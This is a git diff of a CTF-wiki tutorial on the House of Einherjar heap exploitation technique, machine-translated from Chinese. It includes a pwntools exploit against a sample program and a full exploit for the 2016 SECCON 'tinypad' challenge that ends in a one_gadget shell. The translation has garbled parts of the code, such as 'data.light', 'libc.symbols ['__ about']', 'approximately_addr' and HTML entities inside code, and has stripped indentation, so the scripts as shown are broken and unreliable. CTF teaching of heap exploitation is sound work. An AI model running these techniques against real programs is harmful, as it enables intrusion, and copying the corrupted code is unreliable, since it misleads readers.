@@ -1,341 +1,610 @@
+[EN](./house_of_einherjar.md) | [ZH](./house_of_einherjar-zh.md)
 ---
+
 typora-root-url: ../../../docs
+
 ---
+
+
 
 #  House Of Einherjar
 
-## 介绍
 
-house of einherjar 是一种堆利用技术，由 `Hiroki Matsukuma` 提出。该堆利用技术可以强制使得 `malloc` 返回一个几乎任意地址的 chunk 。其主要在于滥用 `free` 中的后向合并操作（合并低地址的chunk），从而使得尽可能避免碎片化。
 
-此外，需要注意的是，在一些特殊大小的堆块中，off by one 不仅可以修改下一个堆块的 prev_size，还可以修改下一个堆块的 PREV_INUSE 比特位。
+## Introduction
 
-## 原理
 
-### 后向合并操作
+The house of einherjar is a heap utilization technique proposed by `Hiroki Matsukuma`. The heap exploit technique forces the `malloc` to return a chunk of almost any address. The main reason is to abuse the backward merge operation in `free` (combining chunks with low addresses), so as to avoid fragmentation as much as possible.
 
-`free` 函数中的后向合并核心操作如下
+
+In addition, it should be noted that in some special-sized heap blocks, off by one can not only modify the prev_size of the next heap block, but also modify the PREV_INUSE bit of the next heap block.
+
+
+## Principle
+
+
+### Backward merge operation
+
+
+The backward merge core operation in the `free` function is as follows
+
 
 ```c
+
         /* consolidate backward */
+
         if (!prev_inuse(p)) {
+
             prevsize = prev_size(p);
+
             size += prevsize;
+
             p = chunk_at_offset(p, -((long) prevsize));
-            unlink(av, p, bck, fwd);
+
+unlink (off, p, bck, fwd);
         }
+
 ```
 
-这里借用原作者的一张图片说明
+
+
+Here borrow a picture from the original author
+
 
 ![](./figure/backward_consolidate.png)
 
-关于整体的操作，请参考 `深入理解堆的实现` 那一章节。
 
-### 利用原理
 
-这里我们就介绍该利用的原理。首先，在之前的堆的介绍中，我们可以知道以下的知识
+For the overall operation, please refer to the chapter on &quot;Understanding the implementation of the heap&quot;.
 
-- 两个物理相邻的 chunk 会共享 `prev_size`字段，尤其是当低地址的 chunk 处于使用状态时，高地址的chunk的该字段便可以被低地址的 chunk 使用。因此，我们有希望可以通过写低地址 chunk 覆盖高地址 chunk 的 `prev_size` 字段。
-- 一个 chunk PREV_INUSE 位标记了其物理相邻的低地址 chunk 的使用状态，而且该位是和 prev_size 物理相邻的。
-- 后向合并时，新的 chunk 的位置取决于 `chunk_at_offset(p, -((long) prevsize))` 。
 
-**那么如果我们可以同时控制一个chunk prev_size 与 PREV_INUSE 字段，那么我们就可以将新的 chunk 指向几乎任何位置。**
+### Utilization principle
 
-### 利用过程
 
-#### 溢出前
+Here we introduce the principle of the use. First of all, in the introduction of the previous heap, we can know the following knowledge
 
-假设溢出前的状态如下
+
+- Two physically adjacent chunks share the `prev_size` field, especially when the low-address chunk is in use, the chunk of the high-address chunk can be used by the chunk of the lower address. Therefore, we hope that the `prev_size` field of the high address chunk can be overwritten by writing the low address chunk.
+- A chunk PREV_INUSE bit marks the usage state of its physically adjacent low address chunk, and this bit is physically adjacent to prev_size.
+- When merging, the location of the new chunk depends on `chunk_at_offset(p, -((long) prevsize))`.
+
+
+**So if we can control a chunk prev_size and PREV_INUSE fields at the same time, then we can point the new chunk to almost any location. **
+
+
+### Utilization process
+
+
+#### Before overflow
+
+
+Assume that the state before overflow is as follows
+
 
 ![](./figure/einherjar_before_overflow.png)
 
-#### 溢出
 
-这里我们假设 p0 堆块一方面可以写prev_size字段，另一方面，存在off by one的漏洞，可以写下一个 chunk 的PREV_INUSE 部分，那么
+
+#### overflow
+
+
+Here we assume that the p0 heap block can write the prev_size field on the one hand, on the other hand, there is a vulnerability of off by one, you can write the PREV_INUSE part of a chunk, then
+
 
 ![](./figure/einherjar_overflowing.png)
 
-#### 溢出后
 
-**假设我们将 p1的 prev_size 字段设置为我们想要的目的 chunk 位置与p1的差值**。在溢出后，我们释放p1，则我们所得到的新的 chunk 的位置 `chunk_at_offset(p1, -((long) prevsize))` 就是我们想要的 chunk 位置了。
 
-当然，需要注意的是，由于这里会对新的 chunk 进行 unlink ，因此需要确保在对应 chunk 位置构造好了fake chunk 以便于绕过 unlink 的检测。
+#### After overflow
+
+
+** Suppose we set the prev_size field of p1 to the difference between the destination chunk location we want and p1**. After the overflow, we release p1, then the position of the new chunk we get `chunk_at_offset(p1, -((long) prevsize))` is the chunk location we want.
+
+
+Of course, it&#39;s important to note that since the new chunk is unlinked, you need to make sure that the fake chunk is constructed in the corresponding chunk location to bypass the unlink detection.
+
 
 ![](./figure/einherjar_after_overflow.png)
 
-### 攻击过程示例
 
-可以进行 House Of Einherjar 攻击的代码：
+
+### Attack process example
+
+
+Code that can be used for House Of Einherjar attacks:
+
 
 ```c
+
 #include <stdio.h>
+
 #include <stdlib.h>
+
 #include <unistd.h>
 
+
+
 int main(void){
+
     char* s0 = malloc(0x200);　//构造fake chunk
+
     char* s1 = malloc(0x18);
+
     char* s2 = malloc(0xf0);　
-    char* s3 = malloc(0x20); //为了不让s2与top chunk 合并
+
+Char* s3 = malloc(0x20); //To prevent s2 from merging with top chunk
     printf("begin\n");
+
     printf("%p\n", s0);
+
     printf("input s0\n");
+
     read(0, s0, 0x200); //读入fake chunk
+
     printf("input s1\n");
+
     read(0, s1, 0x19); //Off By One
+
     free(s2);
+
     return 0;
+
 }
+
 ```
 
-攻击代码如下：
+
+
+The attack code is as follows:
+
 
 ```python
+
 from pwn import *
 
+
+
 p = process("./example")
+
 context.log_level = 'debug'
+
 #gdb.attach(p)
+
 p.recvuntil("begin\n")
+
 address = int(p.recvline().strip(), 16)
+
 p.recvuntil("input s0\n")
+
 payload = p64(0) + p64(0x101) + p64(address) * 2 + "A"*0xe0
+
 '''
-p64(address) * 2是为了绕过
+
+P64(address) * 2 is to bypass
 if (__builtin_expect (FD->bk != P || BK->fd != P, 0))                      \
+
   malloc_printerr ("corrupted double-linked list");
+
 '''
+
 payload += p64(0x100) #fake size
+
 p.sendline(payload)
+
 p.recvuntil("input s1\n")
+
 payload = "A"*0x10 + p64(0x220) + "\x00"
+
 p.sendline(payload)
+
 p.recvall()
+
 p.close()
+
 ```
 
-**注意这里绕过unlink检查的方法跟之前利用unlink漏洞时采用的方法不一样**
 
-利用unlink漏洞的时候：
+
+**Note that the method of bypassing unlink checking here is different from the method used in the previous unlink vulnerability.
+
+
+When using the unlink vulnerability:
+
 
 ```c
+
  p->fd = &p-3*4
+
  p->bk = &p-2*4
+
 ```
 
-在这里利用时，因为没有办法找到 `&p`  ,所以直接让：
+
+
+When used here, because there is no way to find `&amp;p`, so let directly:
 
 ```c
+
 p->fd = p
+
 p->bk = p
+
 ```
 
-**这里需要注意一个点：**
+
+
+** There is one point to note here: **
+
 
 ```python
+
 payload = p64(0) + p64(0x101) + p64(address) * 2 + "A"*0xe0
+
 ```
 
-其实修改为下面这样也是可以的:
+
+
+In fact, it is ok to modify it to the following:
+
 
 ```python
+
 payload = p64(0) + p64(0x221) + p64(address) * 2 + "A"*0xe0
+
 ```
 
-按照道理来讲 fake chunk 的 size 是 `0x221`  才合理，但是为什么  `0x101` 也可以呢？这是因为对 size 和 prev_size 的验证只发生在 unlink 里面，而 unlink 里面是这样验证的:
+
+
+According to the truth, the size of the fake chunk is `0x221`, but why is `0x101`? This is because the validation of size and prev_size only happens in unlink, which is verified in unlink:
+
 
 ```c
+
 if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \
+
       malloc_printerr ("corrupted size vs. prev_size");
+
 ```
 
-所以只需要再伪造 fake chunk 的 next chunk 的 prev_size 字段就好了。
-
-### 总结
-
-这里我们总结下这个利用技术需要注意的地方
-
-- 需要有溢出漏洞可以写物理相邻的高地址的 prev_size 与 PREV_INUSE 部分。
-- 我们需要计算目的 chunk 与 p1 地址之间的差，所以需要泄漏地址。
-- 我们需要在目的 chunk 附近构造相应的 fake chunk，从而绕过 unlink 的检测。
 
 
-其实，该技术与 chunk extend/shrink 技术比较类似。
+So just spoof the prev_size field of the next chunk of the fake chunk.
+
+
+### to sum up
+
+
+Here we summarize the places that need to pay attention to this utilization technology.
+
+
+- An overflow vulnerability is required to write the prev_size and PREV_INUSE parts of a physically adjacent high address.
+- We need to calculate the difference between the destination chunk and the p1 address, so we need to leak the address.
+- We need to construct the corresponding fake chunk near the destination chunk to bypass the unlink detection.
+
+
+
+
+In fact, this technology is similar to the chunk extend/shrink technology.
+
+
 
 
 ## 2016 Seccon tinypad
-[题目链接](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/house-of-einherjar/2016_seccon_tinypad)
+[Topic link] (https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/house-of-einherjar/2016_seccon_tinypad)
 
-### 基本功能分析
 
-首先，可以看出，程序以来一个核心的读取函数，即读取指定长度字节的字符串，然而，当读取的长度恰好为指定的长度时，会出现 **off by one 的漏洞**。
+### Basic function analysis
 
-通过分析程序，我们不难看出，这个程序的基本功能是操作一个 tinypad，主要有以下操作
 
-- 开头，程序每次开头依次判断每个 memo 的指针来判断是否为空，如果不为空，进而利用 strlen 求得其相应的长度，将 memo 的内容输出。从这里，我们也可以看出最多有 4 个 memo。
-- 添加 memo，遍历存储 memo 的变量tinypad，根据 tinypad 的存储的大小判断 memo 是否在使用，然后还有的话，分配一个 memo。从这里我们可以知道，程序只是从 tinypad 起始偏移16*16=256 处才开始使用，每个 memo 存储两个字段，一个是该 memo 的大小，另一个是该 memo 对应的指针。所以我们可以创建一个新的结构体，并修改 ida 识别的 tinypad，使之更加可读（但是其实 ida 没有办法帮忙智能识别。）。同时，由于该添加功能依赖于读取函数，所以存在 off by one 的漏洞。此外，我们可以看出，用户申请的 chunk 的大小最大为 256 字节，和 tinypad 前面的未使用的 256 字节恰好一致。
-- 删除，根据存储 memo 的大小判断 memo 是否在被使用，同时将相应 memo 大小设置为0，但是并没有将指针设置为 NULL，有可能会导致 Use After Free。**即在程序开头时，就有可能输出一些相关的内容，这其实就是我们泄漏一些基地址的基础**。
-- 编辑。在编辑时，程序首先根据之前存储的 memo 的内容将其拷贝到 tinypad 的前 256 个字节中，但正如我们之前所说的，当 memo 存储了 256 个字节时，就会存在 off by one漏洞。与此同时，程序利用 strlen 判断复制之后的 tinypad 的内容长度，并将其输出。之后程序继续利用 strlen 求得 memo 的长度，并读取指定长度内容到 tinypad 中，根据读取函数，这里必然出现了 `\x00`。最后程序将读取到 tinypad 前 256 字节的内容放到对应 memo 中。
-- 退出
+First of all, it can be seen that a core read function since the program, that is, a string that reads a specified length of bytes, however, when the length of the read happens to be the specified length, a vulnerability of **off by one will occur* *.
 
-### 利用
 
-基本利用思路如下
+Through the analysis program, we can easily see that the basic function of this program is to operate a tinypad, mainly the following operations
 
-1. 利用删除时没有将指针置为NULL的 UAF 漏洞，泄漏堆的基地址
-2. 再次利用 UAF 漏洞泄漏 libc 的基地址。
-3. 利用 house of einherjar 方法在 tinypad 的前 256 字节中伪造 chunk。当我们再次申请时，那么就可以控制4个 memo 的指针和内容了。
-4. 这里虽然我们的第一想法可能是直接覆盖 malloc_hook 为 one_gadget 地址，但是，由于当编辑时，程序是利用 strlen 来判读可以读取多少长度，而 malloc_hook 则在初始时为 0。所以我们直接覆盖，所以这里采用其他方法，即修改程序的 main 函数的返回地址为 one_gadget，之所以可以行得通，是因为返回地址往往是 7f 开头的，长度足够长，可以覆盖为one_gadget。所以我们还是需要泄漏 main 函数的返回地址，由于 libc 中存储了 main 函数 environ 指针的地址，所以我们可以先泄露出environ 的地址，然后在得知存储 main 函数的返回地址的地址。这里选取 environ 符号是因为 environ 符号在 libc 中会导出，而像 argc 和 argv 则不会导出，相对来说会比较麻烦一点。
-5. 最后修改 main 函数的返回地址为 one_gadget 地址获取shell。
 
-具体利用脚本如下
+- At the beginning, the program judges each memo pointer at the beginning to judge whether it is empty. If it is not empty, it uses strlen to find its corresponding length, and outputs the content of memo. From here, we can also see that there are up to 4 memo.
+- Add memo, traverse the variable tinypad that stores memo, determine if memo is being used according to the size of the tinypad&#39;s storage, and then, if possible, assign a memo. From here we can know that the program only starts from the tiny offset of 16*16=256. Each memo stores two fields, one is the size of the memo, and the other is the pointer corresponding to the memo. So we can create a new structure and modify the tinypad identified by ida to make it more readable (but there is no way for ida to help intelligently identify it). Also, since this add function relies on the read function, there is a vulnerability of off by one. In addition, we can see that the size of the chunk requested by the user is up to 256 bytes, which is exactly the same as the unused 256 bytes in front of the tinypad.
+- Delete, according to the size of the storage memo to determine whether memo is being used, and set the corresponding memo size to 0, but does not set the pointer to NULL, which may result in Use After Free. ** At the beginning of the program, it is possible to output some related content, which is actually the basis for us to leak some base addresses**.
+- Edit. When editing, the program first copies it to the first 256 bytes of tinypad based on the contents of the previously stored memo, but as we said before, when memo stores 256 bytes, there will be off by one Vulnerabilities. At the same time, the program uses strlen to determine the length of the content of the tinypad after copying and output it. After that, the program continues to use strlen to find the length of memo, and reads the specified length of content into the tinypad. According to the read function, `\x00` must appear here. Finally, the program will read the contents of the first 256 bytes of the tinypad into the corresponding memo.
+- drop out
+
+
+### Use
+
+
+Basic use ideas are as follows
+
+
+1. Using the UAF vulnerability that did not set the pointer to NULL when deleting, the base address of the leaked heap
+2. Re-use the UAF vulnerability to leak the base address of libc.
+3. Use the house of einherjar method to forge chunks in the first 256 bytes of tinypad. When we apply again, we can control the pointers and contents of the four memo.
+4. Although our first thought here may be to directly override malloc_hook as the one_gadget address, however, since the program uses strlen to interpret how much length can be read when editing, malloc_hook is initially 0. So we cover it directly, so here we use other methods, that is, the return address of the main function of the modified program is one_gadget. The reason why it works is because the return address is often beginning with 7f, and the length is long enough to be overwritten as one_gadget. So we still need to leak the return address of the main function. Since libc stores the address of the main function environ pointer, we can first leak the address of environ and then know the address of the return address of the main function. The environ symbol is chosen here because the environ symbol is exported in libc, and argc and argv are not exported, which is relatively cumbersome.
+5. Finally, modify the return address of the main function to the one_gadget address to get the shell.
+
+
+Specific use of the script is as follows
+
 
 ```python
+
 from pwn import *
+
 context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
+
 if args['DEBUG']:
+
     context.log_level = 'debug'
-tinypad = ELF("./tinypad")
+
+tinypad = ELF (&quot;./ tinypad&quot;)
 if args['REMOTE']:
+
     p = remote('127.0.0.1', 7777)
+
     libc = ELF('./libc.so.6')
+
 else:
+
     p = process("./tinypad")
+
     libc = ELF('./libc.so.6')
+
     main_arena_offset = 0x3c4b20
+
 log.info('PID: ' + str(proc.pidof(p)[0]))
 
 
+
+
+
 def add(size, content):
+
     p.recvuntil('(CMD)>>> ')
+
     p.sendline('a')
+
     p.recvuntil('(SIZE)>>> ')
+
     p.sendline(str(size))
+
     p.recvuntil('(CONTENT)>>> ')
+
     p.sendline(content)
+
+
+
 
 
 def edit(idx, content):
+
     p.recvuntil('(CMD)>>> ')
-    p.sendline('e')
+
+p.sendline ( &#39;e&#39;)
     p.recvuntil('(INDEX)>>> ')
+
     p.sendline(str(idx))
+
     p.recvuntil('(CONTENT)>>> ')
+
     p.sendline(content)
+
     p.recvuntil('Is it OK?\n')
+
     p.sendline('Y')
 
 
+
+
+
 def delete(idx):
+
     p.recvuntil('(CMD)>>> ')
+
     p.sendline('d')
+
     p.recvuntil('(INDEX)>>> ')
+
     p.sendline(str(idx))
 
 
+
+
+
 def run():
+
     p.recvuntil(
+
         '  ============================================================================\n\n'
+
     )
+
     # 1. leak heap base
+
     add(0x70, 'a' * 8)  # idx 0
+
     add(0x70, 'b' * 8)  # idx 1
+
     add(0x100, 'c' * 8)  # idx 2
 
+
+
     delete(2)  # delete idx 1
+
     delete(1)  # delete idx 0, idx 0 point to idx 1
+
     p.recvuntil(' # CONTENT: ')
+
     data = p.recvuntil('\n', drop=True)  # get pointer point to idx1
-    heap_base = u64(data.ljust(8, '\x00')) - 0x80
+
+heap_base = u64 (data.light (8, &#39;x00&#39;)) - 0x80
     log.success('get heap base: ' + hex(heap_base))
 
+
+
     # 2. leak libc base
+
     # this will trigger malloc_consolidate
     # first idx0 will go to unsorted bin
+
     # second idx1 will merge with idx0(unlink), and point to idx0
+
     # third idx1 will merge into top chunk
+
     # but cause unlink feture, the idx0's fd and bk won't change
+
     # so idx0 will leak the unsorted bin addr
+
     delete(3)
+
     p.recvuntil(' # CONTENT: ')
+
     data = p.recvuntil('\n', drop=True)
+
     unsorted_offset_arena = 8 + 10 * 8
-    main_arena = u64(data.ljust(8, '\x00')) - unsorted_offset_arena
+
+main_arena = u64 (data.ljust (8, &#39;x00&#39;)) - unsorted_offset_arena
     libc_base = main_arena - main_arena_offset
+
     log.success('main arena addr: ' + hex(main_arena))
+
     log.success('libc base addr: ' + hex(libc_base))
 
+
+
     # 3. house of einherjar
+
     add(0x18, 'a' * 0x18)  # idx 0
+
     # we would like trigger house of einherjar at idx 1
+
     add(0x100, 'b' * 0xf8 + '\x11')  # idx 1
+
     add(0x100, 'c' * 0xf8)  # idx 2
+
     add(0x100, 'd' * 0xf8)  #idx 3
 
+
+
     # create a fake chunk in tinypad's 0x100 buffer, offset 0x20
+
     tinypad_addr = 0x602040
+
     fakechunk_addr = tinypad_addr + 0x20
-    fakechunk_size = 0x101
-    fakechunk = p64(0) + p64(fakechunk_size) + p64(fakechunk_addr) + p64(
-        fakechunk_addr)
-    edit(3, 'd' * 0x20 + fakechunk)
+
+fakechunk_size = 0x101
+fakechunk = p64 (0) + p64 (fakechunk_size) + p64 (fakechunk_addr) + p64 (
+fakechunk_addr)
+edit (3, &#39;d&#39; * 0x20 + fakechunk)
+
 
     # overwrite idx 1's prev_size and
+
     # set minaddr of size to '\x00'
+
     # idx 0's chunk size is 0x20
+
     diff = heap_base + 0x20 - fakechunk_addr
+
     log.info('diff between idx1 and fakechunk: ' + hex(diff))
+
     # '\0' padding caused by strcpy
+
     diff_strip = p64(diff).strip('\0')
+
     number_of_zeros = len(p64(diff)) - len(diff_strip)
+
     for i in range(number_of_zeros + 1):
+
         data = diff_strip.rjust(0x18 - i, 'f')
+
         edit(1, data)
+
     delete(2)
+
     p.recvuntil('\nDeleted.')
 
+
+
     # fix the fake chunk size, fd and bk
+
     # fd and bk must be unsorted bin
+
     edit(4, 'd' * 0x20 + p64(0) + p64(0x101) + p64(main_arena + 88) +
+
          p64(main_arena + 88))
+
+
 
     # 3. overwrite malloc_hook with one_gadget
 
+
+
     one_gadget_addr = libc_base + 0x45216
-    environ_pointer = libc_base + libc.symbols['__environ']
+
+environ_pointer = libc_base + libc.symbols [&#39;__ about&#39;]
     log.info('one gadget addr: ' + hex(one_gadget_addr))
+
     log.info('environ pointer addr: ' + hex(environ_pointer))
+
     #fake_malloc_chunk = main_arena - 60 + 9
+
     # set memo[0].size = 'a'*8,
+
     # set memo[0].content point to environ to leak environ addr
+
     fake_pad = 'f' * (0x100 - 0x20 - 0x10) + 'a' * 8 + p64(
+
         environ_pointer) + 'a' * 8 + p64(0x602148)
+
     # get a fake chunk
+
     add(0x100 - 8, fake_pad)  # idx 2
+
     #gdb.attach(p)
 
+
+
     # get environ addr
+
     p.recvuntil(' # CONTENT: ')
+
     environ_addr = p.recvuntil('\n', drop=True).ljust(8, '\x00')
-    environ_addr = u64(environ_addr)
+
+approximately_addr = u64 (approximately_addr)
     main_ret_addr = environ_addr - 30 * 8
 
+
+
     # set memo[0].content point to main_ret_addr
+
     edit(2, p64(main_ret_addr))
+
     # overwrite main_ret_addr with one_gadget addr
+
     edit(1, p64(one_gadget_addr))
+
     p.interactive()
 
 
+
+
+
 if __name__ == "__main__":
+
     run()
+
 ```
 
 
 
-## 参考文献
+
+
+
+
+## references
+
 
 - https://www.slideshare.net/codeblue_jp/cb16-matsukuma-en-68459606
+
 - https://gist.github.com/hhc0null/4424a2a19a60c7f44e543e32190aaabf
+
 - https://bbs.pediy.com/thread-226119.htm
